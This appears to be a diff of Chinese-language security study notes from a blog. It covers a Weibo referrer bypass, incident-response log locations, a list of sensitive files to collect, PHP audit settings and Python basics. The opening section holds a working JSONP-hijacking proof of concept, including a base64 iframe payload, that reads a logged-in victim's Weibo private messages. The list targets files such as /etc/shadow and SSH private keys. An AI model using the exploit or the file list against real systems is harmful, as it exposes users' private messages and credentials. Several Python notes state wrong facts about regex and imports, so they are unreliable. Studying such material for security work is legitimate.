+</li>
+</ul>
+<p><img src="/images/pasted-0.png" alt="upload successful"></p>
+<ul>
+<li><p>微博的一处referrer绕过</p>
+<blockquote>
+<p><a href="http://ku.ent.sina.com.cn/movie/24413的评分写评论处，" target="_blank" rel="noopener">http://ku.ent.sina.com.cn/movie/24413的评分写评论处，</a><br>支持分享到微博。有检查referer，但可以被绕过，只要referer中<br>带有：<br>ku.ent.sina.com.cn即可以绕过<br>即可以构造Referer为 <a href="http://test.com?http://ku.ent.sina.com.cn/movie/24413" target="_blank" rel="noopener">http://test.com?http://ku.ent.sina.com.cn/movie/24413</a><br>或者子域名ku.ent.sina.com.cn.yida223.top</p>
+</blockquote>
+</li>
+<li><p>新浪获取部分私信的接口存在jsonp劫持漏洞。</p>
+<blockquote>
+<p><a href="http://api.weibo.com/webim/2/direct_messages/contacts.json?source=209678993&amp;count=200&amp;add_virtual_user=5,&amp;is_include_group=0&amp;callback=STK_14511436516391" target="_blank" rel="noopener">http://api.weibo.com/webim/2/direct_messages/contacts.json?source=209678993&amp;count=200&amp;add_virtual_user=5,&amp;is_include_group=0&amp;callback=STK_14511436516391</a><br>在登录微博的情况下访问以上接口会得到一个私信的列表，从中可以提取出部分私信已经双方的昵称来。这个接口做了referer检查，但是<strong>允许referer为空</strong>。用iframe的data伪协议即可绕过</p>
+</blockquote>
+</li>
+</ul>
+<p>构造获取信息并进行操作的页面。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function STK_14511436516391(data)&#123;</span><br><span class="line">	var nickname &#x3D; &quot;&quot;;</span><br><span class="line">	var doc &#x3D; &quot;&quot;;</span><br><span class="line">	for (var i &#x3D; 0; i &lt; data.data.contacts.length; i++) &#123;</span><br><span class="line">		username &#x3D; data.data.contacts[i].user.name</span><br><span class="line">		msg &#x3D; data.data.contacts[i].message.text</span><br><span class="line">		nickname &#x3D; data.data.contacts[i].message.recipient_screen_name</span><br><span class="line">		doc +&#x3D; username+&quot;:&lt;br&gt;&quot;+msg+&quot;&lt;br&gt;&lt;br&gt;&quot;</span><br><span class="line">	&#125;</span><br><span class="line">	doc &#x3D; &quot;Hello &quot;+nickname+&quot;, here is your latest private message list:&lt;br&gt;&lt;br&gt;&quot;+doc</span><br><span class="line">	document.write(doc)</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;api.weibo.com&#x2F;webim&#x2F;2&#x2F;direct_messages&#x2F;contacts.json?source&#x3D;209678993&amp;count&#x3D;200&amp;add_virtual_user&#x3D;5,&amp;is_include_group&#x3D;0&amp;callback&#x3D;STK_14511436516391&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>
+<p>用iframe解决referer问题。即最终payload为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PGhlYWQ+CjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sO2NoYXJzZXQ9dXRmLTgiPgo8L2hlYWQ+Cjxib2R5Pgo8c2NyaXB0PgpmdW5jdGlvbiBTVEtfMTQ1MTE0MzY1MTYzOTEoZGF0YSl7Cgl2YXIgbmlja25hbWUgPSAiIjsKCXZhciBkb2MgPSAiIjsKCWZvciAodmFyIGkgPSAwOyBpIDwgZGF0YS5kYXRhLmNvbnRhY3RzLmxlbmd0aDsgaSsrKSB7CgkJdXNlcm5hbWUgPSBkYXRhLmRhdGEuY29udGFjdHNbaV0udXNlci5uYW1lCgkJbXNnID0gZGF0YS5kYXRhLmNvbnRhY3RzW2ldLm1lc3NhZ2UudGV4dAoJCW5pY2tuYW1lID0gZGF0YS5kYXRhLmNvbnRhY3RzW2ldLm1lc3NhZ2UucmVjaXBpZW50X3NjcmVlbl9uYW1lCgkJZG9jICs9IHVzZXJuYW1lKyI6PGJyPiIrbXNnKyI8YnI+PGJyPiIKCX0KCWRvYyA9ICJIZWxsbyAiK25pY2tuYW1lKyIsIGhlcmUgaXMgeW91ciBsYXRlc3QgcHJpdmF0ZSBtZXNzYWdlIGxpc3Q6PGJyPjxicj4iK2RvYwoJZG9jdW1lbnQud3JpdGUoZG9jKQp9Cjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0iaHR0cDovL2FwaS53ZWliby5jb20vd2ViaW0vMi9kaXJlY3RfbWVzc2FnZXMvY29udGFjdHMuanNvbj9zb3VyY2U9MjA5Njc4OTkzJmNvdW50PTIwMCZhZGRfdmlydHVhbF91c2VyPTUsJmlzX2luY2x1ZGVfZ3JvdXA9MCZjYWxsYmFjaz1TVEtfMTQ1MTE0MzY1MTYzOTEiPjwvc2NyaXB0Pgo8L2JvZHk+&quot; width&#x3D;&quot;100%&quot; height&#x3D;&quot;100%&quot;&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>应急响应学习笔记</title>
+    <url>/2019/07/31/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="0x01-linux常见日志文件位置"><a href="#0x01-linux常见日志文件位置" class="headerlink" title="0x01 linux常见日志文件位置"></a>0x01 linux常见日志文件位置</h2><h5 id="web日志存在位置"><a href="#web日志存在位置" class="headerlink" title="web日志存在位置"></a>web日志存在位置</h5><p><strong>Apache日志</strong><br>Windows: &lt;Apache安装目录&gt;/logs/access.log<br>Linux:  /usr/local/apache/logs/access_log</p>
+<a id="more"></a>
+<p>若默认位置不存在，可通过/etc/httpd/conf/httpd.conf配置来判断。<br><strong>Tomcat日志</strong><br>Tomcat默认不开启日志，可通过&lt;tomcat安装目录&gt;/conf/server.xml配置来判断Tomcat日志位置，一般情况下tomcat日志位于安装目录下的logs文件夹。<br><strong>IIS日志</strong><br>IIS日志默认存储于 %systemroot%\system32\LogFiles\W3SVC目录中<br>通过WEB站点配置可确认其位置：WEB站点 — 属性 — 网站 — W3C扩展日志文件格式 — 属性 — 日志文件目录<br><strong>Nginx日志</strong><br>Linux: /usr/local/nginx/log/access.log<br>若默认位置不存在,可通过/usr/local/nginx/conf/nginx.conf配置来判断。</p>
+<hr>
+<ol>
+<li>/var/log/boot.log（自检过程）</li>
+<li>/var/log/cron （crontab守护进程crond所派生的子进程的动作）</li>
+<li>/var/log/maillog （发送到系统或从系统发出的电子邮件的活动）</li>
+<li>/var/log/syslog （它只记录警告信息，常常是系统出问题的信息，所以更应该关注该文件）</li>
+<li>要让系统生成syslog日志文件，</li>
+<li>在/etc/syslog.conf文件中加上：*.warning /var/log/syslog<br>该日志文件能记录当用户登录时login记录下的错误口令、Sendmail的问题、su命令执行失败等信息</li>
+<li>/var/run/utmp 该日志文件需要使用lastlog命令查看</li>
+<li>/var/log/wtmp （该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件） last命令就通过访问这个文件获得这些信息</li>
+<li>/var/run/utmp （该日志文件记录有关当前登录的每个用户的信息）</li>
+<li>/var/log/xferlog （该日志文件记录FTP会话，可以显示出用户向FTP服务器或从服务器拷贝了什么文件）<h2 id="0x02-webshell应急响应处理"><a href="#0x02-webshell应急响应处理" class="headerlink" title="0x02 webshell应急响应处理"></a>0x02 webshell应急响应处理</h2><h6 id="webshell手工确认（Linux）"><a href="#webshell手工确认（Linux）" class="headerlink" title="webshell手工确认（Linux）:"></a>webshell手工确认（Linux）:</h6><ul>
+<li>常用命令：查找最容易写入webshell的目录</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<p><code>find /var/www/ -perm -010 -type d  -user www-data</code> 具有写入权限的目录<br>-perm&lt;权限数值&gt;：查找符合指定的权限数值的文件或目录；<br>-typ&lt;文件类型&gt;：只寻找符合指定的文件类型的文件；f 普通文件 d目录</p>
+</blockquote>
+<ul>
+<li><p><strong>linux中文件权限位概念：</strong><br>rwx，代表的含义分别是读、写、可执行，而一个文件或目录的属性中又包括所属用户u、所属组g、其他用户o三个部分的属性，</p>
+<ul>
+<li><p>所属用户   所属组    其他用户<br>rwx           rwx         rwx     </p>
+</li>
+<li><p>ps:菜刀的属性含义<br><img src="https://img-blog.csdnimg.cn/2019071618021274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODk0Nzg4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将rwx换算成数字，规则 r=4, w=2, x=1，rwx=4+2+1=7; r-x=4+1=5;r-w=4+2=6</p>
+</li>
+<li><p>用户在其拥有权限的位上设置1，没有权限的位设置0。如果将每个部分的这些权限位看成二进制数，每个部分可以用3位二进制数表示，最大值为7(2^3-1)，表示可读、可写、可执行等权限。</p>
+</li>
+</ul>
+</li>
+<li><p>最近30天内被访问过的脚本文件</p>
+<p>  find /var/www/jcsweb/*.php -type f  -atime -30  </p>
+</li>
+</ul>
+<blockquote>
+<p>常用命令：（查找指定修改时间的脚本文件） Linux文件系统每个文件都有三种时间戳：<br>访问时间（-atime/天，-amin/分钟）：用户最近一次访问时间。<br>修改时间（-mtime/天，-mmin/分钟）：文件最后一次修改时间。<br>变化时间（-ctime/天，-cmin/分钟）：文件数据元（例如权限等）最后一次修改时间。 <code>stat /var/www/jcsweb</code><br>查看文件或目录的时间戳</p>
+</blockquote>
+<h2 id="敏感文件收集"><a href="#敏感文件收集" class="headerlink" title="敏感文件收集"></a>敏感文件收集</h2><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>C:\boot.ini //查看系统版本<br>C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件<br>C:\Windows\repair\sam //存储系统初次安装的密码<br>C:\Program Files\mysql\my.ini //Mysql配置<br>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root<br>C:\Windows\php.ini //php配置信息<br>C:\Windows\my.ini //Mysql配置信息<br>C:\Windows\win.ini //Windows系统的一个基本系统配置文件</p>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>/root/.ssh/authorized_keys<br>/root/.ssh/id_rsa<br>    /root/.ssh/id_ras.keystore<br>/root/.ssh/known_hosts //记录每个访问计算机用户的公钥<br>/etc/passwd<br>/etc/shadow<br>/etc/my.cnf //mysql配置文件<br>/etc/httpd/conf/httpd.conf //apache配置文件<br>/root/.bash_history //用户历史命令记录文件<br>/root/.mysql_history //mysql历史命令记录文件<br>/proc/mounts //记录系统挂载设备<br>/porc/config.gz //内核配置文件<br>/var/lib/mlocate/mlocate.db //全文件路径<br>/porc/self/cmdline //当前进程的cmdline参数</p>
+<p>grep -r “20190518073123439.jpg” /data/logs/cms.gzsk.org.cn_access.log</p>
+]]></content>
+      <categories>
+        <category>应急响应</category>
+      </categories>
+      <tags>
+        <tag>应急响应</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>代码审计学习笔记</title>
+    <url>/2019/06/03/%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="0x01-PHP核心配置讲解"><a href="#0x01-PHP核心配置讲解" class="headerlink" title="0x01 PHP核心配置讲解"></a>0x01 PHP核心配置讲解</h1><h4 id="PHP-INI-常量的定义"><a href="#PHP-INI-常量的定义" class="headerlink" title="PHP_INI_*常量的定义"></a>PHP_INI_*常量的定义</h4><ul>
+<li>PHP_INI_USER<br>该配置可在用户的PHP脚本或window注册表设置<a id="more"></a></li>
+<li>PHP_INI_PERDIR<br>该配置可在php.ini .htaccess或httpd.conf中设置</li>
+<li>PHP_INI _SYSTEM<br>该配置可在php.ini 或httpd.conf中设置</li>
+</ul>
+<ul>
+<li>PHP_INI _ALL<br>该配置可在任何地方设置</li>
+<li>PHP.INI ONLY<br>该配置仅可在php.ini中设置</li>
+</ul>
+<h4 id="register-globals-全局变量注册开关"><a href="#register-globals-全局变量注册开关" class="headerlink" title="register_globals(全局变量注册开关)"></a>register_globals(全局变量注册开关)</h4><ul>
+<li>设置为on的情况下，会直接把用户GET,POST等方式提交上来的参数设置为全局变量并初始化为参数对应的值，使得提交参数可以直接在脚本中使用</li>
+<li>php版本小于等于4.2.3时设置为on，5.3.0被废弃，php版本5.4.0时移除该项<h4 id="allow-url-include-是否允许包含远程文件"><a href="#allow-url-include-是否允许包含远程文件" class="headerlink" title="allow_url_include(是否允许包含远程文件)"></a>allow_url_include(是否允许包含远程文件)</h4></li>
+<li>当存在include(<code>$var</code>)且<code>$var</code>可控时，可直接控制<code>$var</code>变量来执行php代码。此配置在php5.2.0后默认关闭。与之类似配置有allow_url_fopen，配置是否允许打开远程文件<h4 id="magic-quotes-gpc-魔术引号自动过滤"><a href="#magic-quotes-gpc-魔术引号自动过滤" class="headerlink" title="magic_quotes_gpc(魔术引号自动过滤)"></a>magic_quotes_gpc(魔术引号自动过滤)</h4></li>
+<li>配置为on时，会自动在GET,POST,COOKIE变量中的 (单引号)’ 、(双引号)” 、(反斜杠) \ 、空字符(NULL)的前面加上反斜杠()</li>
+</ul>
+<p><strong>但php5中的magic_quotes_gpc不会过滤$_SERVER变量，导致client-ip、referer一类漏洞能够利用（如XFF注入）</strong></p>
+<ul>
+<li>PHP5.3后不推荐使用，PHP5.4后被取消<h4 id="magic-quotes-runtime-魔术引号自动过滤"><a href="#magic-quotes-runtime-魔术引号自动过滤" class="headerlink" title="magic_quotes_runtime(魔术引号自动过滤)"></a>magic_quotes_runtime(魔术引号自动过滤)</h4></li>
+<li>与前面一个函数相似，但区别是它只对从数据库或文件中获取的数据进行过滤，同样在PHP5,4后取消<h4 id="magic-quotes-sybase-魔术引号自动过滤"><a href="#magic-quotes-sybase-魔术引号自动过滤" class="headerlink" title="magic_quotes_sybase(魔术引号自动过滤)"></a>magic_quotes_sybase(魔术引号自动过滤)</h4></li>
+<li>为on时，会覆盖magic_quotes_gpc的配置，与gpc配置类似，但此配置仅仅转义空字符和把单引号变成双引号，也在5.4版本移除</li>
+</ul>
+<h4 id="safe-mode-安全模式"><a href="#safe-mode-安全模式" class="headerlink" title="safe_mode(安全模式)"></a>safe_mode(安全模式)</h4><ul>
+<li>一种安全机制，php5.4后取消</li>
+<li>为on时<ul>
+<li>所有文件操作函数（如unlink()、file()、include()）等都受限制</li>
+<li>通过函数popen()，system()以及exec()等函数执行命令或程序会提示错误<h4 id="open-basedir-PHP可访问目录"><a href="#open-basedir-PHP可访问目录" class="headerlink" title="open_basedir PHP可访问目录"></a>open_basedir PHP可访问目录</h4></li>
+</ul>
+</li>
+<li>用来限制php只能访问哪些目录，若需加载外部脚本，需把脚本路径加到open_basedir指令中，多个目录以分号分割，例如：open_basedir=/www/a/</li>
+<li>在&lt;=php5.2.3时是PHP_INI _SYSTEM,大于时为PHP_INI _ALL<h4 id="disable-function（禁用函数）"><a href="#disable-function（禁用函数）" class="headerlink" title="disable_function（禁用函数）"></a>disable_function（禁用函数）</h4></li>
+<li>禁用一些敏感函数使用，配置范围是php.ini only<h4 id="display-errors和error-reporting错误显示"><a href="#display-errors和error-reporting错误显示" class="headerlink" title="display_errors和error_reporting错误显示"></a>display_errors和error_reporting错误显示</h4></li>
+<li>第一个表示是否显示php脚本内部错误，为on时，还可配置指令error_reporting，这个选项用来配置错误显示的级别<h1 id="审计辅助工具"><a href="#审计辅助工具" class="headerlink" title="审计辅助工具"></a>审计辅助工具</h1><h5 id="代码编辑器"><a href="#代码编辑器" class="headerlink" title="代码编辑器"></a>代码编辑器</h5></li>
+<li>notepad++<h5 id="代码审计工具"><a href="#代码审计工具" class="headerlink" title="代码审计工具"></a>代码审计工具</h5></li>
+<li>Seay源代码审计系统(php)</li>
+<li>Fortify SCA(收费的，但是支持最多编程语言的审计软件)</li>
+<li>RIPS（php）<br>……</li>
+<li>除此之外的审计工具在小迪写的文章里总结的比较好<br><a href="https://t.zsxq.com/fMfuNJa" target="_blank" rel="noopener">https://t.zsxq.com/fMfuNJa</a></li>
+</ul>
+<h1 id="审计思路"><a href="#审计思路" class="headerlink" title="审计思路"></a>审计思路</h1><ol>
+<li>根据敏感关键词回溯参数传递过程</li>
+<li>查找可控变量，正向追踪变量传递过程</li>
+<li>寻找敏感功能点，通读功能点代码</li>
+<li>直接通读全文代码</li>
+</ol>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+        <tag>代码审计</tag>
+        <tag>java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python安全编程学习</title>
+    <url>/2019/05/12/python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h2 id="python正则表达式"><a href="#python正则表达式" class="headerlink" title="python正则表达式"></a>python正则表达式</h2><blockquote>
+<p>python使用re模块提供对正则表达式的支持<br>import re</p>
+</blockquote>
+<blockquote>
+<p>先将正则表达式的字符串形式编译成pattern实例<br>p = re.compile(‘hello’)</p>
+</blockquote>
+<a id="more"></a>
+
+<blockquote>
+<p>使用pattern实例处理文本并获得匹配结果<br>m = p.match(‘hello world’)</p>
+</blockquote>
+<blockquote>
+<p>使用实例获得信息，进行其他操作<br>m.group()   =&gt; ‘hello’</p>
+</blockquote>
+<blockquote>
+<p>或直接：<br>word = re.findall(‘hello’,’hello world’)  =&gt; [‘hello’]</p>
+</blockquote>
+<h3 id="字符-abc-abc"><a href="#字符-abc-abc" class="headerlink" title="字符(abc   abc)"></a>字符(abc   abc)</h3><p>. 任意匹配换行符‘\n’以外的字符，在DOALL模式中也能匹配换行符。例：a.c =&gt; abc<br>[…]  字符集。对应的位置可以是字符集中任意字符。字符集中的字符可以逐个列出，也可给出范围，如[abc]或[a-c]，第一个字符如果是^则表示取反，如[^abc]表示不是abc的其他字符。<br>所有的特殊字符在字符集中都失去原有的特殊含义。在字符集中如果要使用]、-、或^，可在前加上反斜杠</p>
+<hr>
+<p>\d 数字：[0-9]。 例：a\dc =&gt; a1c<br>\D 非数字 。 例：a\Dc =&gt; abc<br>\s 非空字符[&lt;空格&gt;\t\r\f\v]  例：a\sc =&gt; a c<br>\S 非空白字符[^\s] 例：a\Sc =&gt; abc<br>\w 单词字符：[A-Za-z0-9] 例：a\wc =&gt; abc<br>\W 非单词字符：[^\w] 例：a\Wc =&gt; a c</p>
+<hr>
+<p>* 匹配前一个字符0次或无限次。例：abc* == ab(abccc)<br>+ 匹配前一个字符1次或无限次。例：abc+ =&gt; abc(abccc)<br>? 匹配前一个字符1次或0次。例：ab？ =&gt; ab(abc)<br>{m} 匹配前一个字符m次。例：ab{2}c =&gt; abbc<br>{m,n} 匹配前一个字符m至n次，m和n可省略。例：ab{1,2}c=&gt;abc(abbc)</p>
+<hr>
+<p>| 代表左右表达式任意匹配一个，先是尝试匹配左边的表达式，一旦成功则跳过右边的表达式。如果|未包含在()中，则他的范围是整个正则表达式。例：abc|def =&gt; abc(def)<br>(…) 被括起来的作为分组，从表达式左边开始每遇到一个分组的左括号，编号+1，分组表达式作为一个整体，可后接数量词。表达式中|仅在该组中有效 。例：(abc){2} =&gt; abcabc ， a(123|456)c =&gt;a456c</p>
+<hr>
+<p>re.I 忽略大小写<br>re.L 使用预定字符类\w\W\b\B\s\S取决当前区域设定<br>re.M 多行模式改变^和$的行为<br>re.S .任意匹配模式<br>re.U 使用预定字符类\w\W\b\B\s\S\d\D取决于unicode定义的字符属性<br>re.X 详细模式，可多行，忽略空白字符，并可加入注释</p>
+<hr>
+<h3 id="常用正则表达式"><a href="#常用正则表达式" class="headerlink" title="常用正则表达式"></a>常用正则表达式</h3><p>贪婪模式 (.+?)，匹配任意内容，尽可能多匹配字符<br>非贪婪模式 <code>(.*?)</code>，匹配任意内容，尽可能少匹配字符<br>屏蔽中间多余代码 ：[\s\S]*?<br>匹配网址url：<code>[a-zA-Z]+://[^\s]</code><br>匹配IP地址： \d+.\d+.\d+.\d+</p>
+<p>匹配链接地址：<code>href *= *[&#39;&quot;]*(\S+)[&quot;&#39;]</code></p>
+<p>匹配邮箱：<code>/^[-.-_A-Za-z0-9]+@([_A-Za-z0-9]+\.)+[A-Za-z0-9]{2,3}$/</code></p>
+<h2 id="python-web编程"><a href="#python-web编程" class="headerlink" title="python web编程"></a>python web编程</h2><p>相关模块 ：urllib,urllib2,requests</p>
+<h3 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h3><p>url = ‘<a href="https://baidu.com&#39;" target="_blank" rel="noopener">https://baidu.com&#39;</a><br>r = urllib.urlopen(url)<br>print r.read()   =&gt; 返回源代码</p>
+<h3 id="urllib2"><a href="#urllib2" class="headerlink" title="urllib2"></a>urllib2</h3><p>与urllib相比没有urlretrieve（），多了个requests()</p>
+<h3 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h3><p><img src="/images/pasted-38.png" alt="upload successful"></p>
+<p><img src="/images/pasted-39.png" alt="upload successful"></p>
+<p><img src="/images/pasted-40.png" alt="upload successful"></p>
+<p><img src="/images/pasted-41.png" alt="upload successful"></p>
+<p><img src="/images/pasted-42.png" alt="upload successful"></p>
+<p> ps: pycharm中对headers快速加引号</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先ctrl+r</span><br><span class="line">填入(.*?):(.*)   &#39;$1&#39;:&#39;$2&#39;</span><br><span class="line">勾选三个选项</span><br><span class="line">替换</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/images/pasted-43.png" alt="upload successful"></p>
+<h2 id="python爬虫"><a href="#python爬虫" class="headerlink" title="python爬虫"></a>python爬虫</h2><h2 id="python多线程"><a href="#python多线程" class="headerlink" title="python多线程"></a>python多线程</h2><h2 id="文件按行去重"><a href="#文件按行去重" class="headerlink" title="文件按行去重"></a>文件按行去重</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">readfile = <span class="string">"C:/windows/1.txt"</span> <span class="comment">#要去重的文件路径</span></span><br><span class="line">writefile = <span class="string">"C:/windows/2.txt"</span> <span class="comment">#新生成的路径</span></span><br><span class="line">lineset = set()	<span class="comment">#去重,set()函数创建一个无序不重复元素集</span></span><br><span class="line">outfile = open(writefile,<span class="string">'w'</span>)	<span class="comment">#生成文件的对象并写入</span></span><br><span class="line">f = open(readfile,<span class="string">'r'</span>)	<span class="comment">#生成文件的对象并读出</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">	<span class="keyword">if</span> line <span class="keyword">not</span> <span class="keyword">in</span> lineset:</span><br><span class="line">		a +=<span class="number">1</span></span><br><span class="line">		outfile.write(line)</span><br><span class="line">		lineset.add(line)</span><br><span class="line">		print(a)</span><br><span class="line">		print(<span class="string">'\n'</span>)</span><br><span class="line">outfile.close()</span><br><span class="line">print(<span class="string">'success'</span>)</span><br></pre></td></tr></table></figure>
+<p>读取文件每一行</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">"c:\\1.txt"</span>,<span class="string">"r"</span>)  </span><br><span class="line">lines = f.readlines()<span class="comment">#读取全部内容  </span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines  </span><br><span class="line">    <span class="keyword">print</span> line</span><br></pre></td></tr></table></figure>
+<h2 id="python的动态语言特性"><a href="#python的动态语言特性" class="headerlink" title="python的动态语言特性"></a>python的动态语言特性</h2><h3 id="运行的过程中给类绑定-添加-方法"><a href="#运行的过程中给类绑定-添加-方法" class="headerlink" title="运行的过程中给类绑定(添加)方法"></a>运行的过程中给类绑定(添加)方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name = None,age = None)</span>:</span></span><br><span class="line">		self.name = name</span><br><span class="line">		self.age = age</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self,speed)</span>:</span></span><br><span class="line">	print(<span class="string">"the man's speed is %d km/h"</span> %speed)</span><br><span class="line">	</span><br><span class="line">p = person(<span class="string">"xiaohai"</span>,<span class="number">18</span>)</span><br><span class="line"><span class="comment"># 添加方法</span></span><br><span class="line"><span class="keyword">import</span> type</span><br><span class="line">person.run = types.MethodType(run,<span class="literal">None</span>,person)</span><br><span class="line">p.run(<span class="number">20</span>) <span class="comment"># 运行</span></span><br></pre></td></tr></table></figure>
+<h3 id="运行的过程中删除属性、方法"><a href="#运行的过程中删除属性、方法" class="headerlink" title="运行的过程中删除属性、方法"></a>运行的过程中删除属性、方法</h3><h4 id="删除的方法"><a href="#删除的方法" class="headerlink" title="删除的方法:"></a>删除的方法:</h4><p>del 对象.属性名<br>delattr(对象, “属性名”)</p>
+<h3 id="定义一个特殊的slots变量，来限制该class实例能添加的属性"><a href="#定义一个特殊的slots变量，来限制该class实例能添加的属性" class="headerlink" title="定义一个特殊的slots变量，来限制该class实例能添加的属性"></a>定义一个特殊的<strong>slots</strong>变量，来限制该class实例能添加的属性</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">(object)</span>:</span></span><br><span class="line">	__slots__ = (<span class="string">"name"</span>, <span class="string">"age"</span>)  <span class="comment">#该类只能使用name,age属性</span></span><br></pre></td></tr></table></figure>
+<p>注：<strong>slots</strong>定义的属性仅对当前类实例起作用，对继承的子类是不起作用的</p>
+<h2 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h2><ul>
+<li>类似列表，但不必创建完整的list，从而节省大量的空间，这种一边循环一边计算的机制，称为生成器：generator</li>
+<li>要创建一个生成器，有很多种方法。第一种方法很简单，只要把一个列表生成式的 [ ] 改成 ( )<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">15</span>]: L = [ x*<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: L</span><br><span class="line">Out[<span class="number">16</span>]: [<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">17</span>]: G = ( x*<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">In [<span class="number">18</span>]: G</span><br><span class="line">Out[<span class="number">18</span>]: &lt;generator object &lt;genexpr&gt; at <span class="number">0x7f626c132db0</span>&gt;</span><br><span class="line">In [<span class="number">19</span>]: next(G)  <span class="comment">#使用next()函数可一个一个打印出来，但很少用，一般直接用for直接打印出来</span></span><br><span class="line">Out[<span class="number">19</span>]: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">20</span>]: next(G)</span><br><span class="line">Out[<span class="number">20</span>]: <span class="number">2</span></span><br><span class="line">In [<span class="number">26</span>]: G = ( x*<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">In [<span class="number">27</span>]: <span class="keyword">for</span> x <span class="keyword">in</span> G:</span><br><span class="line">   ....:     print(x)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">8</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>常用函数</p>
+<ul>
+<li>find()<br>Python find() 方法检测字符串中是否包含子字符串 str ，如果指定 beg（开始） 和 end（结束） 范围，则检查是否包含在指定范围内，如果包含子字符串返回开始的索引值，否则返回-1。</li>
+</ul>
+<p>str.find(str, beg=0, end=len(string))</p>
+<p>str – 指定检索的字符串<br>beg – 开始索引，默认为0。<br>end – 结束索引，默认为字符串的长度。</p>
+<p>如果包含子字符串返回开始的索引值，否则返回-1。</p>
+<ul>
+<li><p>splite()</p>
+</li>
+<li><p>remove()</p>
+</li>
+<li><p>del</p>
+</li>
+<li><p>item()</p>
+</li>
+<li><p>set()<br>函数创建一个无序不重复元素集<br>可进行关系测试，删除重复数据，还可以计算交集、差集、并集等。</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>x = set(‘runoob’)<br>y = set(‘google’)<br>x, y<br>(set([‘b’, ‘r’, ‘u’, ‘o’, ‘n’]), set([‘e’, ‘o’, ‘g’, ‘l’]))   # 重复的被删除<br>x &amp; y         # 交集<br>set([‘o’])<br>x | y         # 并集<br>set([‘b’, ‘e’, ‘g’, ‘l’, ‘o’, ‘n’, ‘r’, ‘u’])<br>x - y         # 差集<br>set([‘r’, ‘b’, ‘u’, ‘n’])</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li><p>strip()的意思是消除字符串整体的指定字符</p>
+</li>
+<li><p>rstrip()的意思是消除字符串末尾的指定字符<br>括号里什么都不写，默认消除空格和换行符</p>
+</li>
